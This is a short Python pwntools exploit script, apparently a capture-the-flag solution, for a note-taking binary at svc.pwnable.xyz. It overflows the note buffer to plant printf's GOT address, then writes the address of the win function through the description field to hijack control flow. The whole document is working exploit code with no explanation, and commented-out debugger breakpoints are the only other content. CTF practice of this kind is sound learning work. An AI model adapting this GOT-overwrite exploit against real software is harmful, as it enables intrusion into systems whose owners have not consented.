#!/usr/bin/python3 
from pwn import *

context.binary = exe = ELF('./challenge',checksec=False)

#p = process()
p = remote('svc.pwnable.xyz',30016)
#gdb.attach(p,gdbscript='''
#           b*edit_note+25
#           b*edit_note+41
#           b*edit_note+85
  #         b*edit_note+110
   #        b*edit_note+122
    #       b*edit_desc+70
     #      ''')
input()
p.sendlineafter(b'> ',b'1')
p.sendlineafter(b'len? ',b'100')
p.sendlineafter(b'note: ',b'a'*32 + p64(exe.got.printf))

p.sendlineafter(b'> ',b'2')
p.sendlineafter(b'desc: ',p64(exe.sym.win))


p.sendlineafter(b'> ',b'1')
p.interactive()
